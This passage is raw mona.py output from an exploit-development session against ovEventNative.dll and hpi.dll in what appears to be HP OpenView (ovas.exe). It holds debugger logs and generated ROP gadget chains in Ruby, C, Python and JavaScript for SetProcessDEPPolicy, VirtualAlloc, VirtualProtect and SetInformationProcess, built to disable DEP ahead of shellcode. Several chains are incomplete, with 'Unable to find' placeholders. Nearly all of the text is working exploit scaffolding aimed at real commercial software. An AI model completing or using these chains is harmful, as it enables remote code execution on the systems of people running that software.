              ""); //  : 
          
          
          --------------------------------------------------------------------------------------------------
          
          
          ################################################################################
          
          Register setup for SetProcessDEPPolicy() :
          --------------------------------------------
           EAX = <not used>
           ECX = <not used>
           EDX = <not used>
           EBX = dwFlags (ptr to 0x00000000)
           ESP = ReturnTo (automatic)
           EBP = ptr to SetProcessDEPPolicy()
           ESI = <not used>
           EDI = ROP NOP (4 byte stackpivot)
          --------------------------------------------
          
          
          ROP Chain for SetProcessDEPPolicy() [(XP SP3/Vista SP1/2008 Server SP1, can be called only once per process)] :
          ---------------------------------------------------------------------------------------------------------------
          
          *** [ Ruby ] ***
          
            def create_rop_chain()
          
              # rop chain generated with mona.py - www.corelan.be
              rop_gadgets = 
              [
                0x00000000,  # [-] Unable to find ptr to SetProcessDEPPolicy() (-> to be put in ebp)
                0x6d1d142a,  # POP EBX # RETN [hpi.dll] 
                0x6d1d6305,  # &0x00000000 [hpi.dll]
                0x6d1d2f36,  # POP EDI # RETN 0x10 [hpi.dll] 
                0x6d1d2f36,  # skip 4 bytes [hpi.dll]
                0x00000000,  # [-] Unable to find pushad gadget
                0x41414141,  # Filler (RETN offset compensation)
                0x41414141,  # Filler (RETN offset compensation)
                0x41414141,  # Filler (RETN offset compensation)
                0x41414141,  # Filler (RETN offset compensation)
              ].flatten.pack("V*")
          
              return rop_gadgets
          
            end
          
          
            # Call the ROP chain generator inside the 'exploit' function :
          
          
            rop_chain = create_rop_chain()
          
          
          
          *** [ C ] ***
          
            #define CREATE_ROP_CHAIN(name, ...) \
              int name##_length = create_rop_chain(NULL, ##__VA_ARGS__); \
              unsigned int name[name##_length / sizeof(unsigned int)]; \
              create_rop_chain(name, ##__VA_ARGS__);
          
            int create_rop_chain(unsigned int *buf, unsigned int )
            {
              // rop chain generated with mona.py - www.corelan.be
              unsigned int rop_gadgets[] = {
                0x00000000,  // [-] Unable to find ptr to SetProcessDEPPolicy() (-> to be put in ebp)
                0x6d1d142a,  // POP EBX // RETN [hpi.dll] 
                0x6d1d6305,  // &0x00000000 [hpi.dll]
                0x6d1d2f36,  // POP EDI // RETN 0x10 [hpi.dll] 
                0x6d1d2f36,  // skip 4 bytes [hpi.dll]
                0x00000000,  // [-] Unable to find pushad gadget
                0x41414141,  // Filler (RETN offset compensation)
                0x41414141,  // Filler (RETN offset compensation)
                0x41414141,  // Filler (RETN offset compensation)
                0x41414141,  // Filler (RETN offset compensation)
              };
              if(buf != NULL) {
                memcpy(buf, rop_gadgets, sizeof(rop_gadgets));
              };
              return sizeof(rop_gadgets);
            }
          
            // use the 'rop_chain' variable after this call, it's just an unsigned int[]
            CREATE_ROP_CHAIN(rop_chain, );
            // alternatively just allocate a large enough buffer and get the rop chain, i.e.:
            // unsigned int rop_chain[256];
            // int rop_chain_length = create_rop_chain(rop_chain, );
          
          *** [ Python ] ***
          
            def create_rop_chain():
          
              # rop chain generated with mona.py - www.corelan.be
              rop_gadgets = [
                0x00000000,  # [-] Unable to find ptr to SetProcessDEPPolicy() (-> to be put in ebp)
                0x6d1d142a,  # POP EBX # RETN [hpi.dll] 
                0x6d1d6305,  # &0x00000000 [hpi.dll]
                0x6d1d2f36,  # POP EDI # RETN 0x10 [hpi.dll] 
                0x6d1d2f36,  # skip 4 bytes [hpi.dll]
                0x00000000,  # [-] Unable to find pushad gadget
                0x41414141,  # Filler (RETN offset compensation)
                0x41414141,  # Filler (RETN offset compensation)
                0x41414141,  # Filler (RETN offset compensation)
                0x41414141,  # Filler (RETN offset compensation)
              ]
              return ''.join(struct.pack('<I', _) for _ in rop_gadgets)
          
            rop_chain = create_rop_chain()
          
          
          
          *** [ JavaScript ] ***
          
            //rop chain generated with mona.py - www.corelan.be
            rop_gadgets = unescape(
              "%u0000%u0000" + // 0x00000000 : ,# [-] Unable to find ptr to SetProcessDEPPolicy() (-> to be put in ebp)
              "%u142a%u6d1d" + // 0x6d1d142a : ,# POP EBX # RETN [hpi.dll] 
              "%u6305%u6d1d" + // 0x6d1d6305 : ,# &0x00000000 [hpi.dll]
              "%u2f36%u6d1d" + // 0x6d1d2f36 : ,# POP EDI # RETN 0x10 [hpi.dll] 
              "%u2f36%u6d1d" + // 0x6d1d2f36 : ,# skip 4 bytes [hpi.dll]
              "%u0000%u0000" + // 0x00000000 : ,# [-] Unable to find pushad gadget
              "%u4141%u4141" + // 0x41414141 : ,# Filler (RETN offset compensation)
              "%u4141%u4141" + // 0x41414141 : ,# Filler (RETN offset compensation)
              "%u4141%u4141" + // 0x41414141 : ,# Filler (RETN offset compensation)
              "%u4141%u4141" + // 0x41414141 : ,# Filler (RETN offset compensation)
              ""); //  : 
          
          
          --------------------------------------------------------------------------------------------------
          
          
          ################################################################################
          
          Register setup for VirtualAlloc() :
          --------------------------------------------
           EAX = NOP (0x90909090)
           ECX = flProtect (0x40)
           EDX = flAllocationType (0x1000)
           EBX = dwSize
           ESP = lpAddress (automatic)
           EBP = ReturnTo (ptr to jmp esp)
           ESI = ptr to VirtualAlloc()
           EDI = ROP NOP (RETN)
           --- alternative chain ---
           EAX = ptr to &VirtualAlloc()
           ECX = flProtect (0x40)
           EDX = flAllocationType (0x1000)
           EBX = dwSize
           ESP = lpAddress (automatic)
           EBP = POP (skip 4 bytes)
           ESI = ptr to JMP [EAX]
           EDI = ROP NOP (RETN)
           + place ptr to "jmp esp" on stack, below PUSHAD
          --------------------------------------------
          
          
          ROP Chain for VirtualAlloc() [(XP/2003 Server and up)] :
          --------------------------------------------------------
          
          *** [ Ruby ] ***
          
            def create_rop_chain()
          
              # rop chain generated with mona.py - www.corelan.be
              rop_gadgets = 
              [
                0x00000000,  # [-] Unable to find gadgets to pickup the desired API pointer into esi
                0x6d1d408c,  # ptr to &VirtualAlloc() [IAT hpi.dll]
                0x6d1d184c,  # POP EBP # RETN [hpi.dll] 
                0x00000000,  # &  [Unable to find ptr to 'JMP ESP']
                0x6d1d243d,  # POP EBX # RETN [hpi.dll] 
                0x00000001,  # 0x00000001-> ebx
                0x6d1d142a,  # POP EBX # RETN [hpi.dll] 
                0x00001000,  # 0x00001000-> edx
                0x00000000,  # [-] Unable to find a gadget to clear edx
                0x6d1d2f6e,  # ADD EDX,EBX # POP EBX # RETN 0x10 [hpi.dll] 
                0x41414141,  # Filler (compensate)
                0x6d1d2274,  # POP ECX # RETN [hpi.dll] 
                0x41414141,  # Filler (RETN offset compensation)
                0x41414141,  # Filler (RETN offset compensation)
                0x41414141,  # Filler (RETN offset compensation)
                0x41414141,  # Filler (RETN offset compensation)
                0x00000040,  # 0x00000040-> ecx
                0x6d1d2f36,  # POP EDI # RETN 0x10 [hpi.dll] 
                0x6d1d142b,  # RETN (ROP NOP) [hpi.dll]
                0x6d1d1730,  # POP EAX # RETN [hpi.dll] 
                0x41414141,  # Filler (RETN offset compensation)
                0x41414141,  # Filler (RETN offset compensation)
                0x41414141,  # Filler (RETN offset compensation)
                0x41414141,  # Filler (RETN offset compensation)
                0x90909090,  # nop
                0x00000000,  # [-] Unable to find pushad gadget
              ].flatten.pack("V*")
          
              return rop_gadgets
          
            end
          
          
            # Call the ROP chain generator inside the 'exploit' function :
          
          
            rop_chain = create_rop_chain()
          
          
          
          *** [ C ] ***
          
            #define CREATE_ROP_CHAIN(name, ...) \
              int name##_length = create_rop_chain(NULL, ##__VA_ARGS__); \
              unsigned int name[name##_length / sizeof(unsigned int)]; \
              create_rop_chain(name, ##__VA_ARGS__);
          
            int create_rop_chain(unsigned int *buf, unsigned int )
            {
              // rop chain generated with mona.py - www.corelan.be
              unsigned int rop_gadgets[] = {
                0x00000000,  // [-] Unable to find gadgets to pickup the desired API pointer into esi
                0x6d1d408c,  // ptr to &VirtualAlloc() [IAT hpi.dll]
                0x6d1d184c,  // POP EBP // RETN [hpi.dll] 
                0x00000000,  // &  [Unable to find ptr to 'JMP ESP']
                0x6d1d243d,  // POP EBX // RETN [hpi.dll] 
                0x00000001,  // 0x00000001-> ebx
                0x6d1d142a,  // POP EBX // RETN [hpi.dll] 
                0x00001000,  // 0x00001000-> edx
                0x00000000,  // [-] Unable to find a gadget to clear edx
                0x6d1d2f6e,  // ADD EDX,EBX // POP EBX // RETN 0x10 [hpi.dll] 
                0x41414141,  // Filler (compensate)
                0x6d1d2274,  // POP ECX // RETN [hpi.dll] 
                0x41414141,  // Filler (RETN offset compensation)
                0x41414141,  // Filler (RETN offset compensation)
                0x41414141,  // Filler (RETN offset compensation)
                0x41414141,  // Filler (RETN offset compensation)
                0x00000040,  // 0x00000040-> ecx
                0x6d1d2f36,  // POP EDI // RETN 0x10 [hpi.dll] 
                0x6d1d142b,  // RETN (ROP NOP) [hpi.dll]
                0x6d1d1730,  // POP EAX // RETN [hpi.dll] 
                0x41414141,  // Filler (RETN offset compensation)
                0x41414141,  // Filler (RETN offset compensation)
                0x41414141,  // Filler (RETN offset compensation)
                0x41414141,  // Filler (RETN offset compensation)
                0x90909090,  // nop
                0x00000000,  // [-] Unable to find pushad gadget
              };
              if(buf != NULL) {
                memcpy(buf, rop_gadgets, sizeof(rop_gadgets));
              };
              return sizeof(rop_gadgets);
            }
          
            // use the 'rop_chain' variable after this call, it's just an unsigned int[]
            CREATE_ROP_CHAIN(rop_chain, );
            // alternatively just allocate a large enough buffer and get the rop chain, i.e.:
            // unsigned int rop_chain[256];
            // int rop_chain_length = create_rop_chain(rop_chain, );
          
          *** [ Python ] ***
          
            def create_rop_chain():
          
              # rop chain generated with mona.py - www.corelan.be
              rop_gadgets = [
                0x00000000,  # [-] Unable to find gadgets to pickup the desired API pointer into esi
                0x6d1d408c,  # ptr to &VirtualAlloc() [IAT hpi.dll]
                0x6d1d184c,  # POP EBP # RETN [hpi.dll] 
                0x00000000,  # &  [Unable to find ptr to 'JMP ESP']
                0x6d1d243d,  # POP EBX # RETN [hpi.dll] 
                0x00000001,  # 0x00000001-> ebx
                0x6d1d142a,  # POP EBX # RETN [hpi.dll] 
                0x00001000,  # 0x00001000-> edx
                0x00000000,  # [-] Unable to find a gadget to clear edx
                0x6d1d2f6e,  # ADD EDX,EBX # POP EBX # RETN 0x10 [hpi.dll] 
                0x41414141,  # Filler (compensate)
                0x6d1d2274,  # POP ECX # RETN [hpi.dll] 
                0x41414141,  # Filler (RETN offset compensation)
                0x41414141,  # Filler (RETN offset compensation)
                0x41414141,  # Filler (RETN offset compensation)
                0x41414141,  # Filler (RETN offset compensation)
                0x00000040,  # 0x00000040-> ecx
                0x6d1d2f36,  # POP EDI # RETN 0x10 [hpi.dll] 
                0x6d1d142b,  # RETN (ROP NOP) [hpi.dll]
                0x6d1d1730,  # POP EAX # RETN [hpi.dll] 
                0x41414141,  # Filler (RETN offset compensation)
                0x41414141,  # Filler (RETN offset compensation)
                0x41414141,  # Filler (RETN offset compensation)
                0x41414141,  # Filler (RETN offset compensation)
                0x90909090,  # nop
                0x00000000,  # [-] Unable to find pushad gadget
              ]
              return ''.join(struct.pack('<I', _) for _ in rop_gadgets)
          
            rop_chain = create_rop_chain()
          
          
          
          *** [ JavaScript ] ***
          
            //rop chain generated with mona.py - www.corelan.be
            rop_gadgets = unescape(
              "%u0000%u0000" + // 0x00000000 : ,# [-] Unable to find gadgets to pickup the desired API pointer into esi
              "%u408c%u6d1d" + // 0x6d1d408c : ,# ptr to &VirtualAlloc() [IAT hpi.dll]
              "%u184c%u6d1d" + // 0x6d1d184c : ,# POP EBP # RETN [hpi.dll] 
              "%u0000%u0000" + // 0x00000000 : ,# &[Unable to find ptr to 'JMP ESP']
              "%u243d%u6d1d" + // 0x6d1d243d : ,# POP EBX # RETN [hpi.dll] 
              "%u0001%u0000" + // 0x00000001 : ,# 0x00000001-> ebx
              "%u142a%u6d1d" + // 0x6d1d142a : ,# POP EBX # RETN [hpi.dll] 
              "%u1000%u0000" + // 0x00001000 : ,# 0x00001000-> edx
              "%u0000%u0000" + // 0x00000000 : ,# [-] Unable to find a gadget to clear edx
              "%u2f6e%u6d1d" + // 0x6d1d2f6e : ,# ADD EDX,EBX # POP EBX # RETN 0x10 [hpi.dll] 
              "%u4141%u4141" + // 0x41414141 : ,# Filler (compensate)
              "%u2274%u6d1d" + // 0x6d1d2274 : ,# POP ECX # RETN [hpi.dll] 
              "%u4141%u4141" + // 0x41414141 : ,# Filler (RETN offset compensation)
              "%u4141%u4141" + // 0x41414141 : ,# Filler (RETN offset compensation)
              "%u4141%u4141" + // 0x41414141 : ,# Filler (RETN offset compensation)
              "%u4141%u4141" + // 0x41414141 : ,# Filler (RETN offset compensation)
              "%u0040%u0000" + // 0x00000040 : ,# 0x00000040-> ecx
              "%u2f36%u6d1d" + // 0x6d1d2f36 : ,# POP EDI # RETN 0x10 [hpi.dll] 
              "%u142b%u6d1d" + // 0x6d1d142b : ,# RETN (ROP NOP) [hpi.dll]
              "%u1730%u6d1d" + // 0x6d1d1730 : ,# POP EAX # RETN [hpi.dll] 
              "%u4141%u4141" + // 0x41414141 : ,# Filler (RETN offset compensation)
              "%u4141%u4141" + // 0x41414141 : ,# Filler (RETN offset compensation)
              "%u4141%u4141" + // 0x41414141 : ,# Filler (RETN offset compensation)
              "%u4141%u4141" + // 0x41414141 : ,# Filler (RETN offset compensation)
              "%u9090%u9090" + // 0x90909090 : ,# nop
              "%u0000%u0000" + // 0x00000000 : ,# [-] Unable to find pushad gadget
              ""); //  : 
          
          
          --------------------------------------------------------------------------------------------------
          
          
0BADF00D      ROP generator finished
0BADF00D  
0BADF00D  [+] Writing stackpivots to file stackpivot.txt
0BADF00D      Wrote 82 pivots to file 
0BADF00D  [+] Writing suggestions to file rop_suggestions.txt
0BADF00D      Wrote 102 suggestions to file
0BADF00D  [+] Writing results to file rop.txt (288 interesting gadgets)
0BADF00D      Wrote 288 interesting gadgets to file
0BADF00D  [+] Writing other gadgets to file rop.txt (321 gadgets)
0BADF00D      Wrote 321 other gadgets to file
0BADF00D  Done
0BADF00D  
0BADF00D  [+] This mona.py action took 0:00:05.859000
0BADF00D  [+] Command used:
0BADF00D  !mona rop -m ovEventNative.dll
          
          ---------- Mona command started on 2018-10-30 04:47:47 (v2.0, rev 577) ----------
0BADF00D  [+] Processing arguments and criteria
0BADF00D      - Pointer access level : X
0BADF00D      - Only querying modules ovEventNative.dll
0BADF00D  [+] Generating module info table, hang on...
0BADF00D      - Processing modules
0BADF00D      - Done. Let's rock 'n roll.
0BADF00D  [+] Preparing output file '_rop_progress_ovas.exe_29032.log'
0BADF00D      - (Re)setting logfile _rop_progress_ovas.exe_29032.log
0BADF00D  [+] Progress will be written to _rop_progress_ovas.exe_29032.log
0BADF00D  [+] Maximum offset : 40
0BADF00D  [+] (Minimum/optional maximum) stackpivot distance : 8
0BADF00D  [+] Max nr of instructions : 6
0BADF00D  [+] Split output into module rop files ? False
0BADF00D  [+] Enumerating 22 endings in 1 module(s)...
0BADF00D      - Querying module ovEventNative.dll
0BADF00D      - Search complete :
0BADF00D         Ending : RETN 0x0C, Nr found : 5
0BADF00D         Ending : RETN, Nr found : 13
0BADF00D         Ending : RETN 0x08, Nr found : 3
0BADF00D         Ending : RETN 0x24, Nr found : 1
0BADF00D         Ending : RETN 0x10, Nr found : 2
0BADF00D         Ending : RETN 0x14, Nr found : 1
0BADF00D         Ending : RETN 0x04, Nr found : 3
0BADF00D      - Filtering and mutating 28 gadgets
0BADF00D        - Progress update : 28 / 28 items processed (Tue 2018/10/30 04:47:52 AM) - (100%)
0BADF00D  [+] Creating suggestions list
0BADF00D  [+] Processing suggestions
0BADF00D  [+] Launching ROP generator
0BADF00D  [+] Attempting to produce rop chain for VirtualProtect
0BADF00D      Tue 2018/10/30 04:47:52 AM: Step 1/7: esi
0BADF00D  [+] Searching from 0x44440000 to 0x44446000
0BADF00D      Tue 2018/10/30 04:47:54 AM: Step 2/7: ebp
0BADF00D      Tue 2018/10/30 04:47:54 AM: Step 3/7: ebx
0BADF00D      Tue 2018/10/30 04:47:54 AM: Step 4/7: edx
0BADF00D      Tue 2018/10/30 04:47:54 AM: Step 5/7: ecx
0BADF00D      Tue 2018/10/30 04:47:54 AM: Step 6/7: edi
0BADF00D      Tue 2018/10/30 04:47:54 AM: Step 7/7: eax
0BADF00D  [+] Attempting to produce rop chain for SetInformationProcess
0BADF00D      Tue 2018/10/30 04:47:54 AM: Step 1/6: ebp
0BADF00D      Tue 2018/10/30 04:47:55 AM: Step 2/6: edx
0BADF00D      Tue 2018/10/30 04:47:55 AM: Step 3/6: ecx
0BADF00D      Tue 2018/10/30 04:47:55 AM: Step 4/6: ebx
0BADF00D      Tue 2018/10/30 04:47:55 AM: Step 5/6: eax
0BADF00D      Tue 2018/10/30 04:47:55 AM: Step 6/6: edi
0BADF00D  [+] Attempting to produce rop chain for SetProcessDEPPolicy
0BADF00D      Tue 2018/10/30 04:47:55 AM: Step 1/3: ebp
0BADF00D      Tue 2018/10/30 04:47:56 AM: Step 2/3: ebx
0BADF00D      Tue 2018/10/30 04:47:56 AM: Step 3/3: edi
0BADF00D  [+] Attempting to produce rop chain for VirtualAlloc
0BADF00D      Tue 2018/10/30 04:47:56 AM: Step 1/7: esi
0BADF00D  [+] Searching from 0x44440000 to 0x44446000
0BADF00D      Tue 2018/10/30 04:47:57 AM: Step 2/7: ebp
0BADF00D      Tue 2018/10/30 04:47:57 AM: Step 3/7: ebx
0BADF00D      Tue 2018/10/30 04:47:57 AM: Step 4/7: edx
0BADF00D      Tue 2018/10/30 04:47:57 AM: Step 5/7: ecx
0BADF00D      Tue 2018/10/30 04:47:57 AM: Step 6/7: edi
0BADF00D      Tue 2018/10/30 04:47:57 AM: Step 7/7: eax
0BADF00D  [+] ROP chains written to file rop_chains.txt
          
          ################################################################################
          
          Register setup for VirtualProtect() :
          --------------------------------------------
           EAX = NOP (0x90909090)
           ECX = lpOldProtect (ptr to W address)
           EDX = NewProtect (0x40)
           EBX = dwSize
           ESP = lPAddress (automatic)
           EBP = ReturnTo (ptr to jmp esp)
           ESI = ptr to VirtualProtect()
           EDI = ROP NOP (RETN)
           --- alternative chain ---
           EAX = ptr to &VirtualProtect()
           ECX = lpOldProtect (ptr to W address)
           EDX = NewProtect (0x40)
           EBX = dwSize
           ESP = lPAddress (automatic)
           EBP = POP (skip 4 bytes)
           ESI = ptr to JMP [EAX]
           EDI = ROP NOP (RETN)
           + place ptr to "jmp esp" on stack, below PUSHAD
          --------------------------------------------
          
          
          ROP Chain for VirtualProtect() [(XP/2003 Server and up)] :
          ----------------------------------------------------------
          
          *** [ Ruby ] ***
          
            def create_rop_chain()
          
              # rop chain generated with mona.py - www.corelan.be
              rop_gadgets = 
              [
                0x00000000,  # [-] Unable to find gadgets to pickup the desired API pointer into esi
                0x6d3f8098,  # ptr to &VirtualProtect() (skipped module criteria, check if pointer is reliable !) [IAT jvm.dll]
                0x44441e9d,  # POP EBP # RETN [ovEventNative.dll] 
                0x00000000,  # &  [Unable to find ptr to 'JMP ESP']
                0x4444226f,  # POP EBX # POP EBP # RETN 0x0C [ovEventNative.dll] 
                0x00000201,  # 0x00000201-> ebx
                0x41414141,  # Filler (compensate)
                0x00000000,  # [-] Unable to find gadget to put 00000040 into edx
                0x41414141,  # Filler (RETN offset compensation)
                0x41414141,  # Filler (RETN offset compensation)
                0x41414141,  # Filler (RETN offset compensation)
                0x44442293,  # POP ECX # RETN [ovEventNative.dll] 
                0x44444af2,  # &Writable location [ovEventNative.dll]
                0x4444226d,  # POP EDI # POP ESI # POP EBX # POP EBP # RETN 0x0C [ovEventNative.dll] 
                0x444422bd,  # RETN (ROP NOP) [ovEventNative.dll]
                0x41414141,  # Filler (compensate)
                0x41414141,  # Filler (compensate)
                0x41414141,  # Filler (compensate)
                0x444422e0,  # POP EAX # RETN 0x0C [ovEventNative.dll] 
                0x41414141,  # Filler (RETN offset compensation)
                0x41414141,  # Filler (RETN offset compensation)
                0x41414141,  # Filler (RETN offset compensation)
                0x90909090,  # nop
                0x00000000,  # [-] Unable to find pushad gadget
                0x41414141,  # Filler (RETN offset compensation)
                0x41414141,  # Filler (RETN offset compensation)
                0x41414141,  # Filler (RETN offset compensation)
              ].flatten.pack("V*")
          
              return rop_gadgets
          
            end
          
          
            # Call the ROP chain generator inside the 'exploit' function :
          
          
            rop_chain = create_rop_chain()
          
          
          
          *** [ C ] ***
          
            #define CREATE_ROP_CHAIN(name, ...) \
              int name##_length = create_rop_chain(NULL, ##__VA_ARGS__); \
              unsigned int name[name##_length / sizeof(unsigned int)]; \
              create_rop_chain(name, ##__VA_ARGS__);
          
            int create_rop_chain(unsigned int *buf, unsigned int )
            {
              // rop chain generated with mona.py - www.corelan.be
              unsigned int rop_gadgets[] = {
                0x00000000,  // [-] Unable to find gadgets to pickup the desired API pointer into esi
                0x6d3f8098,  // ptr to &VirtualProtect() (skipped module criteria, check if pointer is reliable !) [IAT jvm.dll]
                0x44441e9d,  // POP EBP // RETN [ovEventNative.dll] 
                0x00000000,  // &  [Unable to find ptr to 'JMP ESP']
                0x4444226f,  // POP EBX // POP EBP // RETN 0x0C [ovEventNative.dll] 
                0x00000201,  // 0x00000201-> ebx
                0x41414141,  // Filler (compensate)
                0x00000000,  // [-] Unable to find gadget to put 00000040 into edx
                0x41414141,  // Filler (RETN offset compensation)
                0x41414141,  // Filler (RETN offset compensation)
                0x41414141,  // Filler (RETN offset compensation)
                0x44442293,  // POP ECX // RETN [ovEventNative.dll] 
                0x44444af2,  // &Writable location [ovEventNative.dll]
                0x4444226d,  // POP EDI // POP ESI // POP EBX // POP EBP // RETN 0x0C [ovEventNative.dll] 
                0x444422bd,  // RETN (ROP NOP) [ovEventNative.dll]
                0x41414141,  // Filler (compensate)
                0x41414141,  // Filler (compensate)
                0x41414141,  // Filler (compensate)
                0x444422e0,  // POP EAX // RETN 0x0C [ovEventNative.dll] 
                0x41414141,  // Filler (RETN offset compensation)
                0x41414141,  // Filler (RETN offset compensation)
                0x41414141,  // Filler (RETN offset compensation)
                0x90909090,  // nop
                0x00000000,  // [-] Unable to find pushad gadget
                0x41414141,  // Filler (RETN offset compensation)
                0x41414141,  // Filler (RETN offset compensation)
                0x41414141,  // Filler (RETN offset compensation)
              };
              if(buf != NULL) {
                memcpy(buf, rop_gadgets, sizeof(rop_gadgets));
              };
              return sizeof(rop_gadgets);
            }
          
            // use the 'rop_chain' variable after this call, it's just an unsigned int[]
            CREATE_ROP_CHAIN(rop_chain, );
            // alternatively just allocate a large enough buffer and get the rop chain, i.e.:
            // unsigned int rop_chain[256];
            // int rop_chain_length = create_rop_chain(rop_chain, );
          
          *** [ Python ] ***
          
            def create_rop_chain():
          
              # rop chain generated with mona.py - www.corelan.be
              rop_gadgets = [
                0x00000000,  # [-] Unable to find gadgets to pickup the desired API pointer into esi
                0x6d3f8098,  # ptr to &VirtualProtect() (skipped module criteria, check if pointer is reliable !) [IAT jvm.dll]
                0x44441e9d,  # POP EBP # RETN [ovEventNative.dll] 
                0x00000000,  # &  [Unable to find ptr to 'JMP ESP']
                0x4444226f,  # POP EBX # POP EBP # RETN 0x0C [ovEventNative.dll] 
                0x00000201,  # 0x00000201-> ebx
                0x41414141,  # Filler (compensate)
                0x00000000,  # [-] Unable to find gadget to put 00000040 into edx
                0x41414141,  # Filler (RETN offset compensation)
                0x41414141,  # Filler (RETN offset compensation)
                0x41414141,  # Filler (RETN offset compensation)
                0x44442293,  # POP ECX # RETN [ovEventNative.dll] 
                0x44444af2,  # &Writable location [ovEventNative.dll]
                0x4444226d,  # POP EDI # POP ESI # POP EBX # POP EBP # RETN 0x0C [ovEventNative.dll] 
                0x444422bd,  # RETN (ROP NOP) [ovEventNative.dll]
                0x41414141,  # Filler (compensate)
                0x41414141,  # Filler (compensate)
                0x41414141,  # Filler (compensate)
                0x444422e0,  # POP EAX # RETN 0x0C [ovEventNative.dll] 
                0x41414141,  # Filler (RETN offset compensation)
                0x41414141,  # Filler (RETN offset compensation)
                0x41414141,  # Filler (RETN offset compensation)
                0x90909090,  # nop
                0x00000000,  # [-] Unable to find pushad gadget
                0x41414141,  # Filler (RETN offset compensation)
                0x41414141,  # Filler (RETN offset compensation)
                0x41414141,  # Filler (RETN offset compensation)
              ]
              return ''.join(struct.pack('<I', _) for _ in rop_gadgets)
          
            rop_chain = create_rop_chain()
          
          
          
          *** [ JavaScript ] ***
          
            //rop chain generated with mona.py - www.corelan.be
            rop_gadgets = unescape(
              "%u0000%u0000" + // 0x00000000 : ,# [-] Unable to find gadgets to pickup the desired API pointer into esi
              "%u8098%u6d3f" + // 0x6d3f8098 : ,# ptr to &VirtualProtect() (skipped module criteria, check if pointer is reliable !) [IAT jvm.dll]
              "%u1e9d%u4444" + // 0x44441e9d : ,# POP EBP # RETN [ovEventNative.dll] 
              "%u0000%u0000" + // 0x00000000 : ,# &[Unable to find ptr to 'JMP ESP']
              "%u226f%u4444" + // 0x4444226f : ,# POP EBX # POP EBP # RETN 0x0C [ovEventNative.dll] 
              "%u0201%u0000" + // 0x00000201 : ,# 0x00000201-> ebx
              "%u4141%u4141" + // 0x41414141 : ,# Filler (compensate)
              "%u0000%u0000" + // 0x00000000 : ,# [-] Unable to find gadget to put 00000040 into edx
              "%u4141%u4141" + // 0x41414141 : ,# Filler (RETN offset compensation)
              "%u4141%u4141" + // 0x41414141 : ,# Filler (RETN offset compensation)
              "%u4141%u4141" + // 0x41414141 : ,# Filler (RETN offset compensation)
              "%u2293%u4444" + // 0x44442293 : ,# POP ECX # RETN [ovEventNative.dll] 
              "%u4af2%u4444" + // 0x44444af2 : ,# &Writable location [ovEventNative.dll]
              "%u226d%u4444" + // 0x4444226d : ,# POP EDI # POP ESI # POP EBX # POP EBP # RETN 0x0C [ovEventNative.dll] 
              "%u22bd%u4444" + // 0x444422bd : ,# RETN (ROP NOP) [ovEventNative.dll]
              "%u4141%u4141" + // 0x41414141 : ,# Filler (compensate)
              "%u4141%u4141" + // 0x41414141 : ,# Filler (compensate)
              "%u4141%u4141" + // 0x41414141 : ,# Filler (compensate)
              "%u22e0%u4444" + // 0x444422e0 : ,# POP EAX # RETN 0x0C [ovEventNative.dll] 
              "%u4141%u4141" + // 0x41414141 : ,# Filler (RETN offset compensation)
              "%u4141%u4141" + // 0x41414141 : ,# Filler (RETN offset compensation)
              "%u4141%u4141" + // 0x41414141 : ,# Filler (RETN offset compensation)
              "%u9090%u9090" + // 0x90909090 : ,# nop
              "%u0000%u0000" + // 0x00000000 : ,# [-] Unable to find pushad gadget
              "%u4141%u4141" + // 0x41414141 : ,# Filler (RETN offset compensation)
              "%u4141%u4141" + // 0x41414141 : ,# Filler (RETN offset compensation)
              "%u4141%u4141" + // 0x41414141 : ,# Filler (RETN offset compensation)
              ""); //  : 
          
          
          --------------------------------------------------------------------------------------------------
          
          
          ################################################################################
          
          Register setup for SetInformationProcess() :
          --------------------------------------------
           EAX = SizeOf(ExecuteFlags) (0x4)
           ECX = &ExecuteFlags (ptr to 0x00000002)
           EDX = ProcessExecuteFlags (0x22)
           EBX = NtCurrentProcess (0xffffffff)
           ESP = ReturnTo (automatic)
           EBP = ptr to NtSetInformationProcess()
           ESI = <not used>
           EDI = ROP NOP (4 byte stackpivot)
          --------------------------------------------
          
          
          ROP Chain for SetInformationProcess() [(XP/2003 Server only)] :
          ---------------------------------------------------------------
          
          *** [ Ruby ] ***
          
            def create_rop_chain()
          
              # rop chain generated with mona.py - www.corelan.be
              rop_gadgets = 
              [
                0x00000000,  # [-] Unable to find gadgets to pickup the desired API pointer into ebp
                0x00000000,  # [-] Unable to find ptr to &SetInformationProcess()
                0x00000000,  # [-] Unable to find gadget to put 00000022 into edx
                0x44442293,  # POP ECX # RETN [ovEventNative.dll] 
                0x4444013c,  # &0x00000002 [ovEventNative.dll]
                0x4444226f,  # POP EBX # POP EBP # RETN 0x0C [ovEventNative.dll] 
                0xffffffff,  # 0xffffffff-> ebx
                0x41414141,  # Filler (compensate)
                0x444422e0,  # POP EAX # RETN 0x0C [ovEventNative.dll] 
                0x41414141,  # Filler (RETN offset compensation)
                0x41414141,  # Filler (RETN offset compensation)
                0x41414141,  # Filler (RETN offset compensation)
                0x00000004,  # 0x00000004-> eax
                0x4444226d,  # POP EDI # POP ESI # POP EBX # POP EBP # RETN 0x0C [ovEventNative.dll] 
                0x41414141,  # Filler (RETN offset compensation)
                0x41414141,  # Filler (RETN offset compensation)
                0x41414141,  # Filler (RETN offset compensation)
                0x4444226d,  # skip 4 bytes [ovEventNative.dll]
                0x41414141,  # Filler (compensate)
                0x41414141,  # Filler (compensate)
                0x41414141,  # Filler (compensate)
                0x00000000,  # [-] Unable to find pushad gadget
                0x41414141,  # Filler (RETN offset compensation)
                0x41414141,  # Filler (RETN offset compensation)
                0x41414141,  # Filler (RETN offset compensation)
              ].flatten.pack("V*")
          
              return rop_gadgets
          
            end
          
          
            # Call the ROP chain generator inside the 'exploit' function :
          
          
            rop_chain = create_rop_chain()
          
          
          
          *** [ C ] ***
          
            #define CREATE_ROP_CHAIN(name, ...) \
              int name##_length = create_rop_chain(NULL, ##__VA_ARGS__); \
              unsigned int name[name##_length / sizeof(unsigned int)]; \
              create_rop_chain(name, ##__VA_ARGS__);
          
            int create_rop_chain(unsigned int *buf, unsigned int )
            {
              // rop chain generated with mona.py - www.corelan.be
              unsigned int rop_gadgets[] = {
                0x00000000,  // [-] Unable to find gadgets to pickup the desired API pointer into ebp
                0x00000000,  // [-] Unable to find ptr to &SetInformationProcess()
                0x00000000,  // [-] Unable to find gadget to put 00000022 into edx
                0x44442293,  // POP ECX // RETN [ovEventNative.dll] 
                0x4444013c,  // &0x00000002 [ovEventNative.dll]
                0x4444226f,  // POP EBX // POP EBP // RETN 0x0C [ovEventNative.dll] 
                0xffffffff,  // 0xffffffff-> ebx
                0x41414141,  // Filler (compensate)
